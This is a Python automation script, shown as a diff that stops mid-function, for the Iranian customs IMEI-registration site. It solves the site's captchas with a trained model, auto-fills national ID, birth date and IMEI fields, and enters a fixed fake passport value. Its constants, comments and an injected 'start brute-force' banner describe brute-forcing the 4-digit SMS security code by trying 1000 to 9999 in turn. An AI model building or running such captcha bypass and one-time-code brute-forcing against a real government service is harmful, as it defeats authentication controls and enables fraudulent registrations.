@@ -1,0 +1,2661 @@
+"""
+gomrok.py
+Por kardan-e KHODKAR-e form-e safhe-ye sabt-e IMEI-ye irica (marhale-ye 1):
+  - sabr ta captcha-ye VAGHE'I (na khali) load shavad
+  - khandan-e captcha ba model (best_real_v2.pt)
+  - por kardan-e field-ha: kod-e melli, tarikh-e tavallod, IMEI, tik-e "ghabool daram"
+  - gozashtan-e javab-e captcha dar field-e kod-e amniati
+  - MAKS: dokme-ye "edame" ra NEMIZANAD — panjere baz mimanad ta KHOD-E karbar
+    natije ra check konad va dasti dokme ra bezanad.
+
+Estefade:
+  python gomrok.py --national 0012345678 --birth 1375/04/29 --imei 356938035643809
+  # ya bedun-e argument -> interactive miporsad
+
+Field-ha (az roo-ye form_dump_ready.json — ba wicketpath-e paydar):
+  confirmCheck : form_imeiStep_confirmCheck                       (checkbox "ghabool daram")
+  birthDate    : form_imeiStep_passengerBirthDatePanel_input-append_date  (tarikh)
+  nationalCode : form_imeiStep_passengerNationalCodeField         (kod-e melli)
+  imei[0]      : form_imeiStep_imeiListView_0_codeField           (kod-e IMEI sim1)
+  imei[1]      : form_imeiStep_imeiListView_1_codeField           (kod-e IMEI sim2 — ba dokme-ye form_imeiStep_add)
+  captchaText  : form_imeiStep_captchaPanel_wmc_capchaText         (kod-e amniati)
+  continue     : form_imeiStep_continue1                          (dokme-ye edame)
+"""
+import argparse
+import os
+import re
+import sys
+import time
+from collections import deque
+
+import captcha_collector as cc
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import StaleElementReferenceException
+
+# --- solver ---
+_HERE = os.path.dirname(os.path.abspath(__file__))
+_SOLVER_DIR = os.path.abspath(os.path.join(_HERE, "..", "..", "solver"))
+sys.path.insert(0, _SOLVER_DIR)
+from live_solve import load_solver  # noqa: E402
+
+_DEFAULT_CKPT = os.path.join(_SOLVER_DIR, "checkpoints", "best_real_v2.pt")
+_INPUTS_PATH = os.path.join(_HERE, "inputs.json")
+
+# file-haye dump-e halat-e debug (har marhale rooye inha neveshte mishavad)
+_DBG_HTML = os.path.join(_HERE, "_dbg_last.html")   # source-e kamel-e HTML-e safhe-ye fe'li
+_DBG_JSON = os.path.join(_HERE, "_dbg_last.json")   # kholase-ye vaziat (field-ha/khata-ha)
+
+
+def load_panel_inputs():
+    """Vorudi-haye zakhire-shode-ye panel (panel.py) ra mikhanad. Agar file
+    nabashad ya kharab bashad, dict-e khali barmigardanad."""
+    import json
+    if not os.path.exists(_INPUTS_PATH):
+        return {}
+    try:
+        with open(_INPUTS_PATH, encoding="utf-8") as f:
+            return json.load(f) or {}
+    except Exception as e:
+        print(f">>> HOSHDAR: inputs.json khonde nashod: {e}")
+        return {}
+
+
+_LOGS_PATH = os.path.join(_HERE, "logs.jsonl")
+_SCREENSHOTS_DIR = os.path.join(_HERE, "screenshots")
+
+
+def log_event(status, message, step="", title="", national="", imei=""):
+    """Yek rvidaad-e MOHEM (faghat khata/natije) ra ham dar console va ham dar
+    logs.jsonl (yek JSON dar har khat) zakhire mikonad. Panel-e tahte-web in
+    file ra mikhanad va namayesh midahad (ba serial/IMEI ta bedanim baraye ki bud).
+
+    status: 'error' | 'success' | 'warn' | 'info'
+    """
+    import json
+    rec = {
+        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "title": title or "",
+        "national": national or "",
+        "imei": imei or "",
+        "step": step or "",
+        "status": status,
+        "message": message or "",
+    }
+    tag = {"error": "❌", "success": "✅", "warn": "⚠️", "info": "ℹ️"}.get(status, "•")
+    try:
+        # farsi ra be console-e cp1252 nafrest -> ascii-safe
+        safe = message.encode("unicode_escape").decode("ascii")
+    except Exception:
+        safe = str(message)
+    print(f">>> [LOG {tag} {status}] {step} | serial={imei} | {safe}")
+    try:
+        with open(_LOGS_PATH, "a", encoding="utf-8") as f:
+            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+    except Exception as e:
+        print(f">>> (zakhire-ye log na-shod: {e})")
+
+# wicketpath-e har field (paydartar az id/name ke Wicket avaz mikonad)
+WP_CONFIRM  = "form_imeiStep_confirmCheck"
+WP_BIRTH    = "form_imeiStep_passengerBirthDatePanel_input-append_date"
+WP_NATIONAL = "form_imeiStep_passengerNationalCodeField"
+WP_IMEI0    = "form_imeiStep_imeiListView_0_codeField"
+WP_CAPTCHA  = "form_imeiStep_captchaPanel_wmc_capchaText"
+WP_CONTINUE = "form_imeiStep_continue1"
+
+# khata-haye KOSHANDE-ye imeiStep: in-ha transient NISTAND (serial dar gomrok sabt
+# nashode / voroodi payda nashod / ...). ba retry HICH-vaqt dorost nemishavad, pas
+# bayad ROBOT-ra motevaghef konim (na restart-e bi-payan).
+IMEI_FATAL_MARKERS = [
+    "یافت نشد",        # "... voroodi yaft nashod"
+    "پیدا نشد",
+    "وارد نشده",
+    "ثبت نشده",
+    "نامعتبر",         # kod-e melli/serial-e na-motabar
+    "معتبر نمی",
+    "قبلا",            # "qablan sabt shode" (ehtemalan tekrari)
+    "قبلاً",
+    "ثبت شده است",
+]
+
+# khata-haye MOVAGHAT-e imeiStep / load: retry sari' (F5 ya restart-e sabok).
+# mesl Invalid timestamp / signature / connection — site gozara kharab ast.
+IMEI_TRANSIENT_MARKERS = [
+    "Invalid timestamp",
+    "timestamp is out of range",
+    "out of range",
+    "signature",
+    "decryption",
+    "The signature",
+    "ERR_CONNECTION",
+    "CONNECTION_RESET",
+    "CONNECTION_TIMED",
+    "timeout",
+    "Timed out",
+    "net::",
+    "خطای دریافتی",
+    "استعلام",          # "خطا در استعلام imei از سامانه همتا"
+    "سامانه همتا",
+    "موقتا",
+    "موقت",
+    "بعدا",
+    "دوباره تلاش",
+    "مجددا",
+]
+
+# --- marhale-ye 2 (ba'd az captcha): safhe-ye hamtaStep (etela'at-e gushi + edame) ---
+WP_HAMTA_INFO     = "form_hamtaStep_hamtaInfo"          # matn-e "apple iphone 13 ..."
+WP_HAMTA_CONTINUE = "form_hamtaStep_hamtaStepContinue"  # dokme-ye 'edame' (AJAX)
+WP_HAMTA_BACK     = "form_hamtaStep_hamtaStepBack"      # dokme-ye 'bargasht'
+
+# --- marhale-ye 3 (tscStep): entekhab-e model-e daghigh-e gushi (arzan-tarin) + edame ---
+WP_TSC_CHOICE   = "form_stepsOrInfoPanel_form_tscStep_tscChoice"    # <select> model-ha
+WP_TSC_CONTINUE = "form_stepsOrInfoPanel_form_tscStep_tscContinue"  # dokme-ye 'edame'
+WP_TSC_BACK     = "form_stepsOrInfoPanel_form_tscStep_tscStepBack"  # dokme-ye 'bargasht'
+
+# --- marhale-ye 4 (registrantStep): gomrok + mobile + (kod-e melli) + gozarname + edame ---
+WP_REG_GOMROK   = "form_stepsOrInfoPanel_form_registrantStep_gomrokChoice"   # <select> gomrok
+WP_REG_MOBILE   = "form_stepsOrInfoPanel_form_registrantStep_mobileField"    # shomare-ye mobile
+WP_REG_NATIONAL = "form_stepsOrInfoPanel_form_registrantStep_registrantField"  # kod-e melli (disabled)
+WP_REG_PASSPORT = "form_stepsOrInfoPanel_form_registrantStep_passportField"  # gozarname (sabet="A")
+WP_REG_CONTINUE = "form_stepsOrInfoPanel_form_registrantStep_registrantContinue"  # 'edame'
+WP_REG_BACK     = "form_stepsOrInfoPanel_form_registrantStep_backToTscStep"  # 'bargasht'
+WP_REG_ERROR    = "form_stepsOrInfoPanel_form_registrantStep_errorPanel"     # panel-e khata
+GOMROK_NAME     = "سرو"   # gomrok-e vorudi hamishe 'سرو' (daghigh, na 'بازارچه سرو')
+PASSPORT_VALUE  = "A"     # meghdar-e sabet-e gozarname
+
+# --- marhale-ye 5 (securityCodeStep): kod-e amniati-ye 4-raqami (SMS) + tik + edame ---
+# NEMIDANIM kod chist -> BRUTE-FORCE: 1000..9999 be tartib. dokme-ye 'end' AjaxButton
+# ast (type=button) pas safhe reload NEMISHAVAD va DOM beyn-e talash-ha mimanad.
+WP_SCS_CHECK    = "form_stepsOrInfoPanel_form_securityCodeStep_checkField"     # kod-e amniati (text)
+WP_SCS_CONFIRM  = "form_stepsOrInfoPanel_form_securityCodeStep_confirmCheckContainer_confirmCheck"  # tik-e taahhod
+WP_SCS_END      = "form_stepsOrInfoPanel_form_securityCodeStep_end"           # dokme-ye 'edame' (AJAX)
+WP_SCS_BACK     = "form_stepsOrInfoPanel_form_securityCodeStep_backToRegistrantStep"
+WP_SCS_ERROR    = "form_stepsOrInfoPanel_form_securityCodeStep_errorPanel"
+# dokme-ye pardakht (safhe-ye rasid ba'd az movaffaghiat-e kod-e amniati)
+WP_PARDAKHT     = "form_stepsOrInfoPanel_form_pardakht"
+# matn-e khata-ye kod-e ghalat (baraye tashkhis-e "in kod eshtebah bood")
+SCS_BAD_MSG     = "کد امنیتی صحیح نمی باشد"
+
+
+class DebugController:
+    """Kontrol-e halat-e debugging: yek n0var + dokme-ye 'Next action' balaye
+    safhe tazrigh mikonad. Ghabl az har marhale-ye asasi, step() ta zaman-e
+    zadan-e dokme sabr mikonad. Agar debug khamoosh bashad, step() bi-derang
+    rad mishavad (no-op)."""
+
+    def __init__(self, driver, enabled):
+        self.driver = driver
+        self.enabled = enabled
+        self._injected = False
+        self._n = 0  # shomarande-ye marhale (baraye dump-e state)
+
+    _BANNER_JS = r"""
+    (function(){
+      if (window.__kdbg_ready) return;
+      window.__kdbg_next = false;
+      var bar = document.createElement('div');
+      bar.id = '__kdbg_bar';
+      bar.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;'+
+        'font-family:Tahoma,sans-serif;direction:rtl;background:linear-gradient('+
+        '135deg,#191d31,#221a3d);color:#e7e9f3;border-bottom:2px solid #6d8bff;'+
+        'box-shadow:0 6px 24px rgba(0,0,0,.5);padding:10px 16px;display:flex;'+
+        'align-items:center;gap:14px;';
+      var tag = document.createElement('div');
+      tag.textContent = '🐞 DEBUG';
+      tag.style.cssText = 'font-weight:bold;color:#9d6dff;font-size:13px;flex:0 0 auto;';
+      var step = document.createElement('div');
+      step.id = '__kdbg_step';
+      step.style.cssText = 'flex:1;font-size:13.5px;color:#e7e9f3;';
+      step.innerHTML = 'next step: <b style="color:#39d98a">…</b>';
+      var btn = document.createElement('button');
+      btn.id = '__kdbg_btn';
+      btn.textContent = 'Next action ▶';
+      btn.style.cssText = 'flex:0 0 auto;background:linear-gradient(135deg,#6d8bff,'+
+        '#9d6dff);color:#fff;border:none;border-radius:10px;padding:9px 18px;'+
+        'font-size:14px;font-weight:bold;cursor:pointer;font-family:inherit;'+
+        'box-shadow:0 6px 16px rgba(109,139,255,.4);';
+      btn.onmouseenter=function(){btn.style.filter='brightness(1.1)';};
+      btn.onmouseleave=function(){btn.style.filter='none';};
+      btn.onclick = function(){ window.__kdbg_next = true;
+        btn.disabled=true; btn.style.opacity=.5; btn.textContent='...'; };
+      bar.appendChild(tag); bar.appendChild(step); bar.appendChild(btn);
+      document.body.appendChild(bar);
+      // ja baz kon ta n0var roo-ye mohtava nayoftad
+      document.body.style.paddingTop = (bar.offsetHeight + 6) + 'px';
+      window.__kdbg_ready = true;
+    })();
+    """
+
+    def _ensure_bar(self):
+        try:
+            self.driver.execute_script(self._BANNER_JS)
+            self._injected = True
+        except Exception:
+            self._injected = False
+
+    def _set_label(self, text):
+        try:
+            self.driver.execute_script(
+                "var s=document.getElementById('__kdbg_step');"
+                "if(s){s.innerHTML='next step: <b style=\"color:#39d98a\">'+"
+                "arguments[0].replace(/</g,'&lt;')+'</b>';}"
+                "var b=document.getElementById('__kdbg_btn');"
+                "if(b){b.disabled=false;b.style.opacity=1;b.textContent='Next action ▶';}"
+                "window.__kdbg_next=false;", text)
+        except Exception:
+            pass
+
+    def _dump_state(self, label):
+        """Sourc-e safhe + yek tahlil-e sabok ra dar file zakhire mikonad ta
+        (dar halat-e debug) ba'd az har marhale betavan barresi kard.
+
+        Do file mineveshtad:
+          _dbg_last.html  -> source-e kamel-e HTML-e fe'li-ye safhe
+          _dbg_last.json  -> kholase-ye vaziat (field-ha, khata-ha, hozur-e dokme)
+        Va yek copy-ye shomaredar (_dbg_step_NN.html) baraye tarikhche."""
+        self._n += 1
+        import json as _json
+        try:
+            html = self.driver.page_source
+        except Exception as e:
+            html = f"<!-- page_source error: {e} -->"
+
+        # tahlil-e sabok ba JS (meghdar-e field-ha, khata-haye feedback, hozur-e element-ha)
+        try:
+            state = self.driver.execute_script(r"""
+              function v(name){var e=document.querySelector('[name="'+name+'"]');
+                return e? (e.value||'') : null;}
+              function disp(wp){var e=document.querySelector('[wicketpath="'+wp+'"]');
+                return e? (e.offsetParent!==null) : false;}
+              var errs=[];
+              document.querySelectorAll(
+                '.feedbackPanelERROR, [wicketpath*="feedBack"] li, '+
+                'span[wicketpath*="message"]').forEach(function(e){
+                  var t=(e.innerText||'').trim(); if(t) errs.push(t);});
+              var imeis=Array.from(document.querySelectorAll(
+                'input[wicketpath*="imeiListView"][wicketpath$="codeField"]'))
+                .map(function(e){return e.value;});
+              var capImg=document.querySelector('img.captchaImage');
+              return {
+                url: location.href,
+                national: v('imeiStep:passengerNationalCodeField'),
+                birth: v('imeiStep:passengerBirthDatePanel:input-append:date'),
+                captcha_input: v('imeiStep:captchaPanel:wmc:capchaText'),
+                imei_rows: imeis,
+                confirm_checked: (function(){var e=document.querySelector(
+                  '[name="imeiStep:confirmCheck"]'); return e? e.checked : null;})(),
+                has_continue: !!document.querySelector(
+                  '[wicketpath="form_imeiStep_continue1"]'),
+                continue_visible: disp('form_imeiStep_continue1'),
+                has_captcha_img: !!capImg,
+                captcha_loaded: capImg ? (capImg.naturalWidth||0) > 0 : false,
+                errors: errs
+              };
+            """)
+        except Exception as e:
+            state = {"error": f"analyze failed: {e}"}
+        state["step_no"] = self._n
+        state["label"] = label
+
+        try:
+            with open(_DBG_HTML, "w", encoding="utf-8") as f:
+                f.write(html)
+            # copy-ye shomaredar
+            safe = "".join(c if c.isalnum() else "_" for c in label)[:40]
+            with open(os.path.join(_HERE, f"_dbg_step_{self._n:02d}_{safe}.html"),
+                      "w", encoding="utf-8") as f:
+                f.write(html)
+            with open(_DBG_JSON, "w", encoding="utf-8") as f:
+                _json.dump(state, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            print(f">>> (dump-e state na-shod: {e})")
+
+        # yek khat kholase ru console (baraye did-e sari')
+        if isinstance(state, dict) and "errors" in state:
+            errs = state.get("errors") or []
+            flag = " ⚠ KHATA: " + " | ".join(errs) if errs else ""
+            print(f">>> [state #{self._n}] cont_vis={state.get('continue_visible')} "
+                  f"cap_loaded={state.get('captcha_loaded')} "
+                  f"imei_rows={state.get('imei_rows')}{flag}")
+
+    def notify(self, text):
+        """Faghat n0var-ra be-ruz mikonad va rad mishavad — HICH mekasi nemikonad.
+
+        Baraye marhale-haye HASAS-e be-zaman (mesl-e SUBMIT) ke agar mekas konim
+        captcha monghazi mishavad. Dump-e state ham nemikonad (kond ast)."""
+        print(f">>> [step] {text}")
+        if not self.enabled:
+            return
+        self._ensure_bar()
+        self._set_label(text)
+
+    def step(self, text):
+        """Nam-e marhale-ye ba'di ra neshan bede va (dar halat-e debug) sabr kon
+        ta karbar dokme-ye 'Next action' ra bezanad."""
+        print(f">>> [step] {text}")
+        if not self.enabled:
+            return
+        # sourc-e safhe + tahlil ra zakhire kon (baraye barresi-ye Claude)
+        self._dump_state(text)
+        # n0var ra (dobare) motmaen sho — momken ast safhe ba AJAX refresh shode bashad
+        self._ensure_bar()
+        self._set_label(text)
+        print("    (debug) montazer-e 'Next action' ...")
+        # poll ta dokme zade shavad
+        while True:
+            time.sleep(0.25)
+            try:
+                clicked = self.driver.execute_script("return window.__kdbg_next===true;")
+            except Exception:
+                # safhe avaz shode/n0var raft -> dobare tazrigh kon
+                self._ensure_bar()
+                self._set_label(text)
+                clicked = False
+            if clicked:
+                break
+
+
+class ManualManageController:
+    """Halat-e 'modiriyat-e dasti': n0var-e sabz balaye safhe + dokme-ye
+    'شروع brute-force'. Karbar khodash marhale 1..4 ra dasti miravad, tik-e
+    taahhod-e marhale-5 ra mizanad, sepas in dokme ra mizanad. Rabat check
+    mikonad ke securityCodeStep amade bashad; agar ARE -> brute-force +
+    rasid/pardakht. Agar NA -> payam-e hoshdar va edame-ye sabr."""
+
+    def __init__(self, driver):
+        self.driver = driver
+        self._injected = False
+
+    _BANNER_JS = r"""
+    (function(){
+      if (document.getElementById('__kman_bar')) return;
+      window.__kman_go = false;
+      var bar = document.createElement('div');
+      bar.id = '__kman_bar';
+      bar.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;'+
+        'font-family:Tahoma,sans-serif;direction:rtl;background:linear-gradient('+
+        '135deg,#0f2a1f,#163528);color:#e7f5ee;border-bottom:2px solid #2ecc71;'+
+        'box-shadow:0 6px 24px rgba(0,0,0,.5);padding:10px 16px;display:flex;'+
+        'align-items:center;gap:14px;';
+      var tag = document.createElement('div');
+      tag.textContent = '✋ دستی';
+      tag.style.cssText = 'font-weight:bold;color:#2ecc71;font-size:13px;flex:0 0 auto;';
+      var step = document.createElement('div');
+      step.id = '__kman_step';
+      step.style.cssText = 'flex:1;font-size:13.5px;color:#e7f5ee;line-height:1.5;';
+      step.innerHTML = 'تا صفحه <b style="color:#2ecc71">کد ۴رقمی</b> برو، تیک تعهد را بزن، بعد دکمه را بزن';
+      var btn = document.createElement('button');
+      btn.id = '__kman_btn';
+      btn.textContent = 'شروع brute-force ▶';
+      btn.style.cssText = 'flex:0 0 auto;background:linear-gradient(135deg,#27ae60,'+
+        '#2ecc71);color:#fff;border:none;border-radius:10px;padding:9px 18px;'+
+        'font-size:14px;font-weight:bold;cursor:pointer;font-family:inherit;'+
+        'box-shadow:0 6px 16px rgba(46,204,113,.4);';
+      btn.onmouseenter=function(){btn.style.filter='brightness(1.1)';};
+      btn.onmouseleave=function(){btn.style.filter='none';};
+      btn.onclick = function(){ window.__kman_go = true;
+        btn.disabled=true; btn.style.opacity=.5; btn.textContent='...'; };
+      bar.appendChild(tag); bar.appendChild(step); bar.appendChild(btn);
+      document.body.appendChild(bar);
+      document.body.style.paddingTop = (bar.offsetHeight + 6) + 'px';
+      window.__kman_ready = true;
+    })();
+    """
+
+    def _ensure_bar(self):
+        try:
+            self.driver.execute_script(self._BANNER_JS)
+            self._injected = True
+        except Exception:
+            self._injected = False
+
+    def _set_status(self, html, reset_btn=True):
+        try:
+            self.driver.execute_script(
+                "var s=document.getElementById('__kman_step');"
+                "if(s){s.innerHTML=arguments[0];}"
+                "if(arguments[1]){"
+                "  var b=document.getElementById('__kman_btn');"
+                "  if(b){b.disabled=false;b.style.opacity=1;"
+                "       b.textContent='شروع brute-force ▶';}"
+                "  window.__kman_go=false;"
+                "}", html, bool(reset_btn))
+        except Exception:
+            pass
+
+    def wait_until_user_ready(self):
+        """Sabr ta karbar dokme ra bezanad VA securityCodeStep amade bashad.
+        Agar dokme zade shod vali safhe dorost nist, hoshdar midahad va
+        dobare sabr mikonad. Barmigardanad True."""
+        print(">>> [manual] montazer-e shoma: ta safhe-ye kod-e 4-raqami boro, "
+              "tik bezan, dokme-ye balaye safhe ra bezan.")
+        self._ensure_bar()
+        self._set_status(
+            'تا صفحه <b style="color:#2ecc71">کد ۴رقمی</b> برو، تیک تعهد را بزن، '
+            'بعد دکمه را بزن', reset_btn=True)
+        while True:
+            time.sleep(0.35)
+            try:
+                clicked = self.driver.execute_script(
+                    "return window.__kman_go===true;")
+            except Exception:
+                # safhe avaz / n0var raft (Wicket AJAX) -> dobare tazrigh
+                self._ensure_bar()
+                self._set_status(
+                    'تا صفحه <b style="color:#2ecc71">کد ۴رقمی</b> برو، تیک تعهد را بزن، '
+                    'بعد دکمه را بزن', reset_btn=True)
+                clicked = False
+            if not clicked:
+                # n0var momken ast ba AJAX/Wicket pak shavad — dobare ensure
+                try:
+                    has_bar = self.driver.execute_script(
+                        "return !!document.getElementById('__kman_bar');")
+                except Exception:
+                    has_bar = False
+                if not has_bar:
+                    self._ensure_bar()
+                    self._set_status(
+                        'تا صفحه <b style="color:#2ecc71">کد ۴رقمی</b> برو، تیک تعهد را بزن، '
+                        'بعد دکمه را بزن', reset_btn=True)
+                continue
+
+            # dokme zade shod — aya roo-ye securityCodeStep hastim?
+            on_scs = False
+            try:
+                on_scs = bool(self.driver.find_elements(
+                    By.CSS_SELECTOR, f'[wicketpath="{WP_SCS_CHECK}"]'))
+            except Exception:
+                on_scs = False
+
+            if on_scs:
+                print(">>> [manual] securityCodeStep tashkhis dade shod — "
+                      "shoru'-e brute-force.")
+                self._set_status(
+                    '<b style="color:#2ecc71">✓ صفحه کد تشخیص داده شد</b> — شروع brute-force …',
+                    reset_btn=False)
+                return True
+
+            print(">>> [manual] HOSHDAR: hanooz roo-ye safhe-ye kod-e 4-raqami "
+                  "nistid. tik + dokme ra ba'd az residan bezanid.")
+            self._set_status(
+                '<b style="color:#ff6b7a">⚠ هنوز صفحه کد ۴رقمی نیست</b> — '
+                'تا آن صفحه برو، تیک تعهد را بزن، دوباره دکمه را بزن',
+                reset_btn=True)
+
+
+def find(driver, wicketpath):
+    return driver.find_element(By.CSS_SELECTOR, f'[wicketpath="{wicketpath}"]')
+
+
+def ensure_page_ready(driver, wait, dbg=None, max_reload=5):
+    """Motmaen mishavad safhe KAMEL load shode: dokme-ye 'edame' VA aks-e captcha
+    hozur darand. Ba'zi vaghtha safhe naqes miayad (captcha-ye shekaste va dokme-ye
+    'edame' nist). Dar an surat ba F5 (reload) dobare talash mikonim ta kamel shavad.
+
+    Barmigardanad True agar safhe amade shod, vagarna False."""
+    for i in range(max_reload):
+        try:
+            btn = driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_CONTINUE}"]')
+            cap = driver.find_elements(By.CSS_SELECTOR, cc.CAPTCHA_CSS)
+            has_btn = bool(btn) and btn[0].is_displayed()
+            # aks-e captcha bayad vojud dashte bashad VA load shode bashad (arz > 0)
+            has_cap = False
+            if cap:
+                try:
+                    w = driver.execute_script("return arguments[0].naturalWidth||0;", cap[0])
+                    has_cap = bool(w and w > 0)
+                except Exception:
+                    has_cap = cap[0].is_displayed()
+            if has_btn and has_cap:
+                return True
+        except Exception:
+            pass
+        # naqes ast -> F5
+        if dbg:
+            dbg.step(f"reload (F5): safhe naqes bood (dokme/captcha nist) — talash #{i + 1}")
+        print(f">>> safhe naqes (dokme-ye 'edame' ya captcha nist) — reload #{i + 1} ...")
+        try:
+            driver.refresh()
+        except Exception as e:
+            print(f">>> khata dar reload: {e}")
+        # ba'd az reload sabr ta captcha-ye salem biayad
+        try:
+            cc.ensure_real_captcha(driver, wait, 0.8)
+        except Exception:
+            time.sleep(2)
+    # akharin check
+    try:
+        btn = driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_CONTINUE}"]')
+        return bool(btn) and btn[0].is_displayed()
+    except Exception:
+        return False
+
+
+WP_IMEI_ADD = "form_imeiStep_add"  # dokme-ye '+' baraye radif-e IMEI-ye dovom (dual-SIM)
+
+
+def imei_rows(driver):
+    """Hame-ye field-haye IMEI (radif-ha). Ba'd az tayp, site ba AJAX yek radif-e
+    khali-ye ENTEHA ezafe mikonad, pas tedad-e radif-ha avaz mishavad."""
+    return driver.find_elements(
+        By.CSS_SELECTOR,
+        'input[wicketpath*="imeiListView"][wicketpath$="codeField"]')
+
+
+def set_imei_js(driver, el, value):
+    """Field-e IMEI ra FAGHAT ba event-e 'input' por mikonad — NA 'change'/'blur'.
+
+    CHERA: field-e IMEI dar safhe-ye avvaliye yek onchange-AjaxBehavior darad (algu-ye
+    ma'moul-e Wicket ListView) ke ba TAGHYIR-e meghdar (event-e change/blur) yek radif-e
+    khali-ye jadid te-ye list misazad. send_keys ba'd az etmam focus ra rha mikonad va
+    'change' shellik mishavad -> radif-e dovom sakhte mishavad -> submit be khatere IMEI-ye
+    khali rad mishavad. Ba set-e JS + faghat 'input', meghdar dar DOM mineshinad va hengam-e
+    submit ersal mishavad, vali AJAX-e afzoodan HICHVAGHT fa'al nemishavad."""
+    driver.execute_script(
+        "const el=arguments[0], v=arguments[1];"
+        "el.focus();"
+        "el.value=v;"
+        "el.dispatchEvent(new Event('input',{bubbles:true}));",
+        el, value)
+
+
+def _ajax_idle(driver, timeout=8.0):
+    """Sabr ta loader-e Wicket napadid shavad (ya timeout)."""
+    dl = time.time() + timeout
+    while time.time() < dl:
+        try:
+            busy = driver.execute_script(r"""
+                var ind = document.querySelectorAll(
+                  '.wicket-ajax-indicator,'+
+                  '[wicketpath$="indicator_indicatorImg"],'+
+                  '[wicketpath="form_indicator_indicatorImg"]');
+                for (var j=0;j<ind.length;j++){
+                  if (ind[j].offsetParent !== null) return true;
+                }
+                return false;
+            """)
+        except Exception:
+            busy = False
+        if not busy:
+            return True
+        time.sleep(0.15)
+    return False
+
+
+def _click_imei_add(driver):
+    """Dokme-ye afzoodan-e radif-e IMEI (form_imeiStep_add) — touch/pointer chain
+    chon dar mobile-emulation .click()-e sade kar nemikonad."""
+    btns = driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_IMEI_ADD}"]')
+    if not btns:
+        return False
+    btn = btns[0]
+    try:
+        driver.execute_script(
+            "arguments[0].scrollIntoView({block:'center'});", btn)
+        cc.fire_refresh_events(driver, btn)
+        return True
+    except Exception as e:
+        print(f">>> (click-e afzoodan-e IMEI na-shod: {e})")
+        return False
+
+
+def _ensure_imei_row_count(driver, need, tries=8):
+    """Ta 'need' radif-e IMEI dar list bashad. Agar kam bud, dokme-ye add ra mizanad.
+    Barmigardanad True agar tedad >= need."""
+    need = max(1, int(need))
+    for _ in range(tries):
+        rows = imei_rows(driver)
+        if len(rows) >= need:
+            return True
+        before = len(rows)
+        print(f">>> afzoodan-e radif-e IMEI (alan={before}, niaz={need}) ...")
+        if not _click_imei_add(driver):
+            time.sleep(0.5)
+            continue
+        _ajax_idle(driver, timeout=6.0)
+        time.sleep(0.4)
+        after = len(imei_rows(driver))
+        if after <= before:
+            # shayad click nakhord — yek talash-e digar
+            time.sleep(0.5)
+    return len(imei_rows(driver)) >= need
+
+
+def _fill_one_imei(driver, idx, target, tries):
+    """Radif-e idx-om ra ba target por mikonad — ba JS (faghat input) ta AJAX-e
+    afzoodan-e radif fa'al nashavad. Ba retry, chon momken ast AJAX-i pak/render konad."""
+    for _ in range(tries):
+        rows = imei_rows(driver)
+        if idx >= len(rows):
+            time.sleep(0.4)
+            continue
+        el = rows[idx]
+        if (el.get_attribute("value") or "").strip() == target:
+            return True
+        set_imei_js(driver, el, target)
+        time.sleep(0.6)
+    rows = imei_rows(driver)
+    return idx < len(rows) and (rows[idx].get_attribute("value") or "").strip() == target
+
+
+def fill_imeis(driver, imeis, dbg=None, tries=5):
+    """Yek ya do IMEI ra por mikonad (dual-SIM).
+      - radif 0 hamishe hast
+      - agar imeis[1] bud -> dokme-ye add ta radif 1 biayad, sepas por kon
+      - FAGHAT event-e input (set_imei_js) ta radif-e fantom sakhte nashavad
+    Barmigardanad list-e bool baraye har IMEI."""
+    imeis = [str(x).strip() for x in (imeis or []) if x and str(x).strip()]
+    # site dual-SIM max 2 (sim1 + sim2)
+    imeis = imeis[:2]
+    if not imeis:
+        return []
+    if len(imeis) >= 2:
+        if not _ensure_imei_row_count(driver, 2, tries=8):
+            print(">>> HOSHDAR: radif-e dovom-e IMEI sakhte nashod.")
+    results = []
+    for i, val in enumerate(imeis):
+        if dbg:
+            dbg.step(f"input: IMEI[{i}] = {val}")
+        ok = _fill_one_imei(driver, i, val, tries=tries)
+        print(f">>> IMEI fill [{i}] -> {val!r} = {ok}")
+        results.append(ok)
+    return results
+
+
+def verify_imeis(driver, imeis):
+    """Meghdar-e fe'li-ye radif-ha ra ba list-e imeis moghayese mikonad.
+    Barmigardanad (ok:bool, current_values:list)."""
+    want = [str(x).strip() for x in (imeis or []) if x and str(x).strip()][:2]
+    rows = imei_rows(driver)
+    cur = [(r.get_attribute("value") or "").strip() for r in rows]
+    ok = True
+    for i, v in enumerate(want):
+        if i >= len(cur) or cur[i] != v:
+            ok = False
+            break
+    return ok, cur
+
+
+def cleanup_extra_empty_imei_rows(driver, keep, dbg=None):
+    """Radif-haye khali-ye EZAFE (ba'd az 'keep' radif-e por) ra yek-bar hazf mikonad.
+    keep = tedad-e IMEI-haye por-shode-ye ma'mour. bedun-e halghe-ye bi-payan."""
+    keep = max(1, int(keep))
+    all_rows = imei_rows(driver)
+    if len(all_rows) <= keep:
+        return
+    for el in all_rows[keep:]:
+        if (el.get_attribute("value") or "").strip():
+            continue  # por ast — dast nazan (shayad dual-SIM)
+        wp = el.get_attribute("wicketpath") or ""
+        m = re.search(r"imeiListView_(\d+)_", wp)
+        if not m:
+            continue
+        n = m.group(1)
+        if int(n) < keep:
+            continue
+        try:
+            rm = driver.find_element(
+                By.CSS_SELECTOR,
+                f'[wicketpath="form_imeiStep_imeiListView_{n}_remove"]')
+            if dbg:
+                dbg.step(f"click: hazf-e radif-e khali-ye ezafe (wicket #{n})")
+            driver.execute_script("arguments[0].click();", rm)
+            time.sleep(1.0)
+            _ajax_idle(driver, timeout=4.0)
+        except Exception:
+            pass
+        break  # faghat yek radif, bedun-e halghe
+
+
+def type_field(driver, el, value):
+    """Field-e matni ra ba tayp-e vaghe'i por mikonad (click + clear + send_keys)."""
+    driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+    time.sleep(0.2)
+    try:
+        el.click()
+    except Exception:
+        driver.execute_script("arguments[0].focus();", el)
+    el.clear()
+    el.send_keys(value)
+
+
+def set_field_js(driver, el, value):
+    """Field ra ba JS por mikonad + dispatch-e input/change (baraye datepicker
+    ke ba send_keys taqvim baz mikonad va mozahem mishavad)."""
